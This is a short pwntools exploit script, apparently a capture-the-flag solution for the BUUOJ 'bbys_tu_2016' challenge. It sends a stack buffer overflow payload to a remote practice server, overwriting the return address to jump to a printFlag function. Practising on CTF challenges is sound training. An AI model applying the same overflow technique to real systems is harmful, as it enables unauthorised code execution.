from pwn import *

#p = process('./bbys_tu_2016')
p = remote('node4.buuoj.cn', 28514)
elf = ELF('bbys_tu_2016')

ret = 0x080483be

flag = elf.sym['printFlag']

payload = b'a' * ( 0xc + 4 ) + p32(ret) * 3 + p32(flag)

p.sendline(payload)

p.interactive()
